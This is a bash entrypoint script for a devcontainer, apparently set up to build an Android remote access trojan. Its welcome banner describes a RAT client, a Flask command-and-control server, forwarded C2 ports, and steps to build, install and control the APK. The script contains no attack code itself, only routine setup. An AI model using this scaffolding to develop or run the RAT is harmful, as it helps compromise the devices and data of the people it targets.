#!/bin/bash
# DevContainer Entrypoint Script
# Runs when the container starts

set -e

echo "========================================="
echo "  RAT APK Builder - DevContainer Startup"
echo "========================================="

# Ensure correct permissions
chown -R vscode:vscode /home/vscode /opt/android-sdk /opt/android-ndk /home/vscode/.gradle 2>/dev/null || true

# Start ADB server
echo "Starting ADB server..."
sudo -u vscode /opt/android-sdk/platform-tools/adb start-server

# Verify Android SDK
echo "Android SDK: $ANDROID_HOME"
echo "Platform tools: $(/opt/android-sdk/platform-tools/adb version | head -1)"
echo "Build tools: $(ls /opt/android-sdk/build-tools/ | tail -1)"

# Verify Gradle
echo "Gradle: $(gradle --version | head -1)"

# Verify Java
echo "Java: $(java -version 2>&1 | head -1)"

# Verify Kotlin
echo "Kotlin: $(kotlinc -version 2>&1)"

# Set up Git if not configured
if [ ! -f /home/vscode/.gitconfig ]; then
    sudo -u vscode git config --global user.name "RAT Developer"
    sudo -u vscode git config --global user.email "rat@codespaces.local"
    sudo -u vscode git config --global init.defaultBranch main
fi

# Display welcome message
cat << 'WELCOME'

=========================================
  RAT APK Builder Environment Ready!
=========================================

Available Commands:
  build-apk.sh          - Build all APK variants (debug/release)
  start-emulator.sh     - Start Android emulator (headless)
  start-c2.sh           - Start C2 server on port 8080
  adb devices           - List connected devices
  gradle tasks          - List available Gradle tasks

Project Structure:
  /workspaces/rat-project/
  ├── android-client/     - Android RAT client (Gradle/Kotlin)
  ├── c2-server/          - Python Flask C2 server
  ├── .devcontainer/      - DevContainer configuration
  └── .github/workflows/  - CI/CD pipelines

Quick Start:
  1. cd android-client && ./gradlew assembleDebug
  2. Start emulator: ./start-emulator.sh (in separate terminal)
  3. Install APK: adb install app/build/outputs/apk/debug/app-debug.apk
  4. Start C2: ./start-c2.sh (in separate terminal)
  5. Open dashboard: http://localhost:8080/dashboard

Environment Variables:
  C2_HOST=0.0.0.0
  C2_PORT=8080
  C2_PROTOCOL=http

Ports Forwarded:
  8080  - C2 Server HTTP
  8081  - C2 Server WebSocket
  5554  - Emulator Console
  5555  - Emulator ADB

=========================================

WELCOME

# Execute the command passed to docker run
exec "$@"